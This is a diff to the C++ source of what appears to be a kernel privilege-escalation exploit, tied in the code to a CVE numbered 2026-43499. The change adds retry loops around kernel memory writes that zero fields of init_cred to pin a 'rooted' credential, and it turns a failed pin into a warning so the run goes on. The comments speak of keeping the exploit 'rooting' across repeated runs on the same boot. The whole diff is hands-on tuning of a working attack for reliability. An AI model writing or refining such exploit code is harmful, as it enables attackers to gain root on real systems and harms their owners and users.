@@ -478,20 +478,32 @@ namespace ghostlock::session::backend {
             }
             const memory::WriteRequest usage_pin = memory::WriteRequest::make(
                 init_cred, memory::WriteMode::Zero, /*leaf=*/0);
-            if (!Cve2026_43499Policy::template attack_write<M>(
-                    session, usage_pin, "W1p: init_cred usage pin")) {
-                pr_warning("cred pin: usage pin failed; the boot will stop rooting after ~4 "
-                           "successful runs\n");
-                return false;
-            }
             const memory::WriteRequest uid_repair = memory::WriteRequest::make(
                 init_cred + 4, memory::WriteMode::Zero, /*leaf=*/1);
-            if (!Cve2026_43499Policy::template attack_write<M>(
-                    session, uid_repair, "W1p: init_cred uid repair")) {
-                pr_warning("cred pin: uid repair failed; rooted children will read a garbage "
-                           "getuid()\n");
-                return false;
+
+            /* Retried, because a single dance failing is normal: the same reason
+             * every other stage carries an attempt ladder. Three tries each, then
+             * give up and let the run proceed. */
+            bool pinned = false;
+            for (uint32_t attempt = 1; attempt <= 3 && !pinned; attempt++) {
+                if (!Cve2026_43499Policy::template attack_write<M>(
+                        session, usage_pin, "W1p: init_cred usage pin")) {
+                    pr_info("cred pin: usage pin attempt %u/3 missed\n", attempt);
+                    usleep(50000);
+                    continue;
+                }
+                if (!Cve2026_43499Policy::template attack_write<M>(
+                        session, uid_repair, "W1p: init_cred uid repair")) {
+                    /* The usage pin landed but uid did not get repaired: rooted
+                     * children would read a garbage getuid(). Try the pair again
+                     * from the top rather than leaving it half-applied. */
+                    pr_info("cred pin: uid repair attempt %u/3 missed\n", attempt);
+                    usleep(50000);
+                    continue;
+                }
+                pinned = true;
             }
+            if (!pinned) return false;
             pr_success("init_cred usage pinned; the rooted cred is immortal this boot\n");
             return true;
         }
@@ -647,8 +659,15 @@ namespace ghostlock::session::backend {
         }
 
         /* Before the first root of this run: make the cred it points at
-         * immortal. See cred_pin(). */
-        if (!cred_pin<M>(session)) return StageResult::Failed;
+         * immortal. See cred_pin(). Best-effort on purpose -- a missed write is
+         * the ordinary case every other stage retries, and aborting the run
+         * because the *hardening* did not land would turn a degraded boot into a
+         * certain failure. Measured on stock: failing the run here cost the
+         * first run of a clean boot outright. */
+        if (!cred_pin<M>(session)) {
+            pr_warning("cred pin: not applied this run; the boot will stop rooting after "
+                       "~4 successful roots (reboot to clear)\n");
+        }
 
         /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
          * child, so respawn and redo. */
